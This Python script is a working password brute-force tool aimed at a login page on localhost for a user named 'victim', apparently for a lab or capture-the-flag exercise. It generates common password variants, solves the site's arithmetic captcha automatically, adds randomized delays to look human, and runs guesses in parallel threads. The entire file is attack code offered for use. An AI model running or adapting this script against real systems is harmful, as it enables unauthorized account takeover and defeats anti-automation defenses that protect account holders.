import requests
import concurrent.futures
import time
import random
from bs4 import BeautifulSoup

# Target configuration
TARGET_URL = "http://127.0.0.1:5000/login"
TARGET_USERNAME = "victim"  # Replace with the actual target username

found = False
found_password = None


def extract_captcha(html):
    """
    Extract the mathematical captcha answer from the HTML.
    For example, if the page shows "Captcha: 3 + 5 = ?", this function returns "8".
    """
    soup = BeautifulSoup(html, 'html.parser')
    captcha_label = soup.find('label', text=lambda t: t and 'Captcha:' in t)
    if captcha_label:
        # Extract the text after ":" and parse the math expression
        question = captcha_label.get_text(strip=True).split(':')[-1].strip()
        try:
            parts = question.split('+')
            a = int(parts[0].strip())
            b = int(parts[1].split('=')[0].strip())
            return str(a + b)
        except Exception as e:
            print(f"[!] Error parsing captcha: {e}")
            return None
    return None


def generate_passwords(username):
    """
    Generate a list of potential passwords using common passwords and variants.
    """
    common_passwords = [
        "password", "123456", username, f"{username}123",
        "admin", "welcome", "qwerty", "letmein", "12345"
    ]
    variants = []
    for pwd in common_passwords:
        variants.extend([pwd, pwd + "!", pwd.upper(), pwd + "2024"])
    return variants


def attempt_password(pwd):
    """
    Attempt to log in using a specific password.
    If the response indicates a captcha is needed, try to extract and submit the captcha answer.
    If the login is successful (HTTP 302 redirect to "/" or "/index"), mark the password as found.
    """
    global found, found_password
    # Create a new session for each attempt (or you can reuse a global session)
    session = requests.Session()
    # Establish session cookies by a GET request
    session.get(TARGET_URL)

    data = {"username": TARGET_USERNAME, "password": pwd}
    # Random delay to mimic human behavior
    time.sleep(random.uniform(0.5, 1.5))

    try:
        # Send login POST request without auto-redirects
        response = session.post(TARGET_URL, data=data, allow_redirects=False, timeout=5)
        print(f"[*] Trying: {pwd} | Status: {response.status_code} | Location: {response.headers.get('Location', '')}")

        # Check if the response indicates that a captcha is required
        if "Captcha:" in response.text:
            captcha_answer = extract_captcha(response.text)
            if captcha_answer:
                data["captcha"] = captcha_answer
                response = session.post(TARGET_URL, data=data, allow_redirects=False, timeout=5)
                print(
                    f"[*] After captcha, trying: {pwd} | Status: {response.status_code} | Location: {response.headers.get('Location', '')}")

        # Check for a successful login: HTTP 302 and redirect to "/" or "/index"
        if response.status_code == 302 and response.headers.get('Location', '') in ["/", "/index"]:
            found = True
            found_password = pwd
    except Exception as e:
        print(f"[!] Error attempting password {pwd}: {e}")


def main():
    global found, found_password
    passwords = generate_passwords(TARGET_USERNAME)
    max_workers = 10
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(attempt_password, pwd) for pwd in passwords]
        for future in concurrent.futures.as_completed(futures):
            if found:
                break

    if found:
        print(f"\n[SUCCESS] Valid password found: {found_password}")
    else:
        print("\n[FAILED] No valid password found.")


if __name__ == "__main__":
    print("[*] Starting brute force attack...")
    start_time = time.time()
    main()
    end_time = time.time()
    print(f"Total time: {end_time - start_time:.2f} seconds")
